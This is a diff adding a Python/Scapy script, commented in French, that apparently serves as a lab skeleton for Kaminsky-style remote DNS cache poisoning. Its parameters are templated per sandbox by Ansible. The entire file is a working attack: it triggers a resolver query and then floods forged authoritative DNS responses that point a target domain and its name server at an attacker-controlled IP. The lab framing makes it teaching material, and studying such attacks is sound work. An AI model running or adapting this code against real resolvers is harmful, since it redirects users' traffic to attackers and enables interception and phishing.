@@ -1,0 +1,60 @@
+#!/usr/bin/env python3
+"""
+Remote DNS cache poisoning (Kaminsky-style) - squelette pedagogique.
+Parametres injectes par Ansible : differents pour chaque sandbox.
+
+Principe :
+  1. On force local-dns a interroger attacker-ns (en demandant la
+     resolution d'un sous-domaine de la zone que l'on controle).
+  2. Pendant que attacker-ns traite la vraie requete, on bombarde
+     local-dns de reponses DNS forgees, usurpant l'autorite sur
+     TARGET_DOMAIN, avant que la reponse legitime n'arrive.
+  3. Si une reponse forgee "gagne la course" (bon port source /
+     bon transaction ID), le cache de local-dns est empoisonne :
+     TARGET_DOMAIN pointera desormais vers SPOOFED_IP.
+"""
+from scapy.all import *
+import threading
+
+LOCAL_DNS_IP   = "10.1.26.9"
+ATTACKER_NS_IP = "10.1.27.9"
+TARGET_DOMAIN  = "{{ target_domain }}.lab"
+ATTACKER_ZONE  = "{{ attacker_zone }}.attacker.lab"
+SPOOFED_IP     = "{{ spoofed_ip }}"
+
+# Port source devine/observe du resolveur victime (simule ici par la
+# plateforme via une variable par sandbox - en conditions reelles il
+# faudrait le deviner/observer).
+GUESSED_SRC_PORT = {{ dns_src_port }}
+
+
+def trigger_query():
+    """Force local-dns a interroger attacker-ns pour une sous-zone."""
+    query = IP(dst=LOCAL_DNS_IP) / UDP(sport=RandShort(), dport=53) / \
+        DNS(rd=1, qd=DNSQR(qname=f"trigger.{ATTACKER_ZONE}"))
+    send(query, verbose=0)
+
+
+def flood_forged_responses(count=200):
+    """Envoie des reponses DNS forgees usurpant TARGET_DOMAIN."""
+    for txid in range(count):
+        forged = IP(src=ATTACKER_NS_IP, dst=LOCAL_DNS_IP) / \
+            UDP(sport=53, dport=GUESSED_SRC_PORT) / \
+            DNS(
+                id=txid,
+                qr=1, aa=1, rd=1, ra=1,
+                qd=DNSQR(qname=f"trigger.{ATTACKER_ZONE}"),
+                an=DNSRR(rrname=TARGET_DOMAIN, type="A", ttl=86400, rdata=SPOOFED_IP) /
+                   DNSRR(rrname=TARGET_DOMAIN, type="NS", ttl=86400, rdata="ns.attacker.lab") /
+                   DNSRR(rrname="ns.attacker.lab", type="A", ttl=86400, rdata=ATTACKER_NS_IP),
+                ancount=1, nscount=1, arcount=1,
+            )
+        send(forged, verbose=0)
+
+
+if __name__ == "__main__":
+    t = threading.Thread(target=trigger_query)
+    t.start()
+    flood_forged_responses()
+    t.join()
+    print(f"[+] Attaque terminee. Verifie avec: dig {TARGET_DOMAIN} @{LOCAL_DNS_IP}")
